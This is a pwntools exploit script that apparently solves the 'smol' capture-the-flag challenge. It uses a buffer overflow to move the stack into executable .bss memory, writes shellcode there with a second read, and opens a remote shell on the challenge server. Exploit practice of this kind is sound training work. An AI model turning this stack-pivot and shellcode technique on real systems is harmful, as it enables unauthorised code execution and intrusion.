import pwn

pwn.context.binary = elf = pwn.ELF("./smol")

if pwn.args.LOCAL:
    io = pwn.process("./smol")
else:
    io = pwn.remote("pwn.utctf.live", 9998)

if pwn.args.GDB:
    pwn.gdb.attach(
        io,
        gdbscript="""
break *(&_read+32)
continue
    """,
    )

bss = 0x402020  # Add 0x20 so the stack has room to grow without segfaulting
read_again = 0x401015  # Address of `_read`

payload = b"A" * 8
# Overwrite $rbp to migrate stack to .bss, which is RWX
payload += pwn.p64(bss + 0x10)
# Set return address to `_read` to write our shellcode onto our new stack.
payload += pwn.p64(read_again)

io.sendline(payload)

payload = b"B" * 16
# Overwrite return address to jump to our shellcode
payload += pwn.p64(bss + 0x20)
# Add our shellcode
payload += pwn.asm(pwn.shellcraft.sh())

io.sendline(payload)
io.interactive()
